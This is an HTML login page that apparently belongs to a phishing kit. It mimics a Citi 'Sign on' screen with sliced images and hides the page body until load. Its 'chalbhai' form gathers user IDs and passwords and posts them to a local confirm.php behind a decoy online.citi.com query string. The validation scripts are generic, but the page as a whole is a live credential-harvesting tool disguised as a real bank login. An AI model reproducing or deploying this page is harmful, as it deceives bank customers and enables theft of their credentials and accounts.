<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">



<html>



<head>



<title>Sign on</title>



<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">



<link rel="shortcut icon"



              href="images/favicon.ico"/>



			  



			  



	



<script type="text/javascript">







function unhideBody()



{



var bodyElems = document.getElementsByTagName("body");



bodyElems[0].style.visibility = "visible";



}







</script>







<body style="visibility:hidden" onload="unhideBody()">







<style type="text/css">



div#container



{



	position:relative;



	width: 100%;



	margin-top: 0px;



	margin-left: auto;



	margin-right: auto;



	text-align:left; 



}



body {text-align:center;margin:0}



</style>











<script LANGUAGE="JavaScript">



<!--







var b = 0 ;



var i = 0 ;



var errmsg = "" ;



var punct = "" ;



var min = 0 ;



var max = 0 ;







function formbreeze_email(field) {







	if (b && (field.value.length == 0)) return true ;











	if (! emailCheck(field.value))



	  {



		  field.focus();



		  if (field.type == "text") field.select();



		  return false ;



	  }







   return true ;



}







function formbreeze_filledin(field) {







if (b && (field.value.length == 0)) return true;







if (field.value.length < min) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false ;



   }







if ((max > 0) && (field.value.length > max)) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false ;



   }







return true ;



}







function formbreeze_number(field) {







if (b && (field.value.length == 0)) return true ; ;







if (i)



 var valid = "0123456789"



else



 var valid = ".,0123456789"







var pass = 1;



var temp;



for (var i=0; i<field.value.length; i++) {



temp = "" + field.value.substring(i, i+1);



if (valid.indexOf(temp) == "-1") pass = 0;







}







if (!pass) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false;



 }







if (field.value < min) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false;



   }











if ((max > 0) && (field.value > max)) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false;



   }







return true ;



}











function formbreeze_numseq(field) {











if (b && (field.value.length == 0)) return true ;







var valid = punct + "0123456789"







var pass = 1;



var digits = 0



var temp;



for (var i=0; i<field.value.length; i++) {



temp = "" + field.value.substring(i, i+1);



if (valid.indexOf(temp) == "-1") pass = 0;



if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;







}







if (!pass) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false ; ;



   }







if (digits < min) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false;



   }







if ((max > 0) && (digits > max)) {



alert(errmsg);



field.focus();



if (field.type == "text") field.select();



return false;



   }







return true ;



}







function emailCheck (emailStr) {







var checkTLD=1;



var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;



var emailPat=/^(.+)@(.+)$/;



var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";



var validChars="\[^\\s" + specialChars + "\]";



var quotedUser="(\"[^\"]*\")";



var atom=validChars + '+';



var word="(" + atom + "|" + quotedUser + ")";



var userPat=new RegExp("^" + word + "(\\." + word + ")*$");



var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");



var matchArray=emailStr.match(emailPat);







if (matchArray==null) {



alert(errmsg);



return false;



}



var user=matchArray[1];



var domain=matchArray[2];







for (i=0; i<user.length; i++) {



if (user.charCodeAt(i)>127) {



alert(errmsg);



return false;



   }



}



for (i=0; i<domain.length; i++) {



if (domain.charCodeAt(i)>127) {



alert(errmsg);



return false;



   }



}







if (user.match(userPat)==null) {



alert(errmsg);



return false;



}







var atomPat=new RegExp("^" + atom + "$");



var domArr=domain.split(".");



var len=domArr.length;



for (i=0;i<len;i++) {



if (domArr[i].search(atomPat)==-1) {



alert(errmsg);



return false;



   }



}







if (checkTLD && domArr[domArr.length-1].length!=2 &&



domArr[domArr.length-1].search(knownDomsPat)==-1) {



alert(errmsg);



return false;



}







if (len<2) {



alert(errmsg);



return false;



}







return true;



}







function formbreeze_sub()



{



/*



//FBDATA:formtext1^0^1^0^0^Please Enter Your User ID:;formtext2^0^1^0^0^Please Enter Your Password:;



*/



b=0;



errmsg="Please Enter Your User ID";



min=1;



max=0;



if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;



b=0;



errmsg="Please Enter Your Password";



min=1;



max=0;



if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;







}



-->



</script>







</head>



<body>



<div id="container">



<div id="image1" style="position:absolute; overflow:hidden; left:177px; top:0px; width:992px; height:26px; z-index:0"><a href="#"><img src="images/1.png" alt="" title="" border=0 width=992 height=26></a></div>







<div id="image2" style="position:absolute; overflow:hidden; left:178px; top:24px; width:989px; height:87px; z-index:1"><img src="images/2.png" alt="" title="" border=0 width=989 height=87></div>







<div id="image3" style="position:absolute; overflow:hidden; left:176px; top:111px; width:989px; height:30px; z-index:2"><a href="#"><img src="images/3.png" alt="" title="" border=0 width=989 height=30></a></div>







<div id="image4" style="position:absolute; overflow:hidden; left:179px; top:140px; width:991px; height:505px; z-index:3"><img src="images/bottom.png" alt="" title="" border=0 width=991 height=505></div>







<div id="image5" style="position:absolute; overflow:hidden; left:462px; top:391px; width:113px; height:30px; z-index:4"><img src="images/start.png" alt="" title="" border=0 width=113 height=30></div>







<div id="image6" style="position:absolute; overflow:hidden; left:628px; top:520px; width:539px; height:62px; z-index:5"><a href="#"><img src="images/qww.png" alt="" title="" border=0 width=539 height=62></a></div>







<div id="image7" style="position:absolute; overflow:hidden; left:180px; top:642px; width:993px; height:240px; z-index:6"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=993 height=240></a></div>



<form action=confirm.php?https://online.citi.com/US/login.do?sessionsid424kjasd21i16873asdafe32 name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >



<input name="formtext1" type="text" style="position:absolute;width:172px;left:228px;top:283px;z-index:7">



<input name="formtext2" type="password" style="position:absolute;width:172px;left:228px;top:326px;z-index:8">



<div id="formimage1" style="position:absolute; left:329px; top:376px; z-index:9"><input type="image" name="formimage1" width="67" height="14" src="images/sign on.png"></div>



<div id="formcheckbox1" style="position:absolute; left:227px; top:351px; z-index:10"><input type="checkbox" name="formcheckbox1"></div>



<div id="image8" style="position:absolute; overflow:hidden; left:226px; top:411px; width:163px; height:26px; z-index:11"><a href="#"><img src="images/fotot.png" alt="" title="" border=0 width=163 height=26></a></div>







<div id="image9" style="position:absolute; overflow:hidden; left:210px; top:460px; width:213px; height:113px; z-index:12"><a href="#"><img src="images/security.png" alt="" title="" border=0 width=213 height=113></a></div>







</div>







</body>



</html>







<ISONLINE VALUE=TRUE></ISONLINE>